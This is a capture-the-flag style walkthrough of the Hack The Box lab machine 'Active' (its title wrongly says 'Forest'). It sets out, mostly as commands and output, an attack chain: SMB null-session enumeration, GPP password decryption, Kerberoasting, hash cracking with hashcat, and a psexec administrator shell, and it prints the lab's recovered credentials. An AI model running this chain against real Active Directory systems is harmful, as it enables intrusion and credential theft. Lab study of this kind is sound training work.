---
title: "HTB Forest"
date: 2026-05-15 11:24 +0100
categories: [CPTS Preparation]
tags: [HTB, Machine, Windows, Easy]
image: /assets/img/posts/active/active.png
---
**HTB Active** is a Windows `Active Directory` machine that starts with unauthenticated `SMB` null session enumeration to access the `Replication` share, recovers plaintext credentials from a `Groups.xml` file via `GPP decryption`, and escalates to `Domain Administrator` by performing `Kerberoasting` with the recovered `SVC_TGS` account to crack the Administrator's service ticket hash.
## Reconnaissance
### Scanning
- Nmap (All ports)
```
nmap -p- 10.129.38.185 -nv --min-rate 1000
```
```
PORT      STATE    SERVICE                                                                                             
53/tcp    open     domain                                     
88/tcp    open     kerberos-sec
135/tcp   open     msrpc
139/tcp   open     netbios-ssn
389/tcp   open     ldap
445/tcp   open     microsoft-ds
464/tcp   open     kpasswd5
593/tcp   open     http-rpc-epmap
636/tcp   open     ldapssl
3268/tcp  open     globalcatLDAP
3269/tcp  open     globalcatLDAPssl
5722/tcp  open     msdfsr
9389/tcp  open     adws
47001/tcp open     winrm
49152/tcp open     unknown
49153/tcp open     unknown
49154/tcp open     unknown
49155/tcp open     unknown
49157/tcp open     unknown
49158/tcp open     unknown
49162/tcp open     unknown
49166/tcp open     unknown
49168/tcp open     unknown
```
- NSE Scripts & Version
```
nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49162,49166,49168 10.129.38.185 -nv --min-rate 1000
```
```
PORT      STATE SERVICE       VERSION                                                                                                                        
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)                                                                 
| dns-nsid:                                                                                                                                                  
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)                                                                                                          
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-15 22:23:25Z)                                                                 
135/tcp   open  msrpc         Microsoft Windows RPC                                                                                                          
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn                                                                                                  
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)                                    
445/tcp   open  microsoft-ds?                                                                                                                                
464/tcp   open  kpasswd5?                                                                                                                                    
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0                                                                                            
636/tcp   open  tcpwrapped                                                                                                                                   
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)                                    
3269/tcp  open  tcpwrapped                                                                                                                                   
5722/tcp  open  msrpc         Microsoft Windows RPC                                                                                                          
9389/tcp  open  mc-nmf        .NET Message Framing                                                                                                           
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                                                        
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49162/tcp open  msrpc         Microsoft Windows RPC
49166/tcp open  msrpc         Microsoft Windows RPC
49168/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
Host script results:
| smb2-time: 
|   date: 2026-05-15T22:24:27
|_  start_date: 2026-05-15T22:09:42
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled and required
|_clock-skew: 6s
```
### Configuration
- /etc/hosts
```
sudo nxc smb 10.129.38.185 --generate-hosts-file /etc/hosts
```
- /etc/krb5.conf
```
sudo nxc smb DC.active.htb --generate-krb5-file /etc/krb5.conf
```
- time
```
sudo ntpdate -u active.htb
```
### Enumeration
- SMB (Null Session)
```
➜  Active nxc smb DC.active.htb -u '' -p ''                         
SMB         10.129.38.185   445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.38.185   445    DC               [+] active.htb\:
```
- SMB Shares (Null Session)
```
➜  Active nxc smb DC.active.htb -u '' -p '' --shares                
SMB         10.129.38.185   445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.38.185   445    DC               [+] active.htb\: 
SMB         10.129.38.185   445    DC               [*] Enumerated shares
SMB         10.129.38.185   445    DC               Share           Permissions     Remark
SMB         10.129.38.185   445    DC               -----           -----------     ------
SMB         10.129.38.185   445    DC               ADMIN$                          Remote Admin
SMB         10.129.38.185   445    DC               C$                              Default share
SMB         10.129.38.185   445    DC               IPC$                            Remote IPC
SMB         10.129.38.185   445    DC               NETLOGON                        Logon server share 
SMB         10.129.38.185   445    DC               Replication     READ            
SMB         10.129.38.185   445    DC               SYSVOL                          Logon server share 
SMB         10.129.38.185   445    DC               Users
```
- SMB Spider_plus
```
nxc smb DC.active.htb -u '' -p '' -M spider_plus -o DOWNLOAD_FLAG=True EXCLUDE_FILTER='print$,ipc$,admin$,c$,netlogon,sysvol,users'
```
### Gpp-decrypt
```
active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
```
```
uv run gpp-decrypt -f Groups.xml
```
```
[ • ] Type: User Account
[ • ] Username: active.htb\SVC_TGS
[ ✓ ] Password: GPPstillStandingStrong2k18
```
## Kerberoasting
```
➜  Active nxc smb DC.active.htb -u 'svc_tgs' -p 'GPPstillStandingStrong2k18'                                                                 
SMB         10.129.38.185   445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.38.185   445    DC               [+] active.htb\svc_tgs:GPPstillStandingStrong2k18
```
```
impacket-GetUserSPNs -request -dc-ip 10.129.38.185 'active.htb/svc_tgs:GPPstillStandingStrong2k18' -outputfile hash.txt
```
```
nxc ldap DC.active.htb -u 'svc_tgs' -p 'GPPstillStandingStrong2k18' --kerberoasting hash.txt
```
```
hashcat -a 0 -m 13100 hash.txt rockyou.txt -d 1 -O
```
```
Administrator:Ticketmaster1968
```
## Shell as Administrator
```
impacket-psexec 'active.htb/Administrator:Ticketmaster1968@10.129.38.185'
```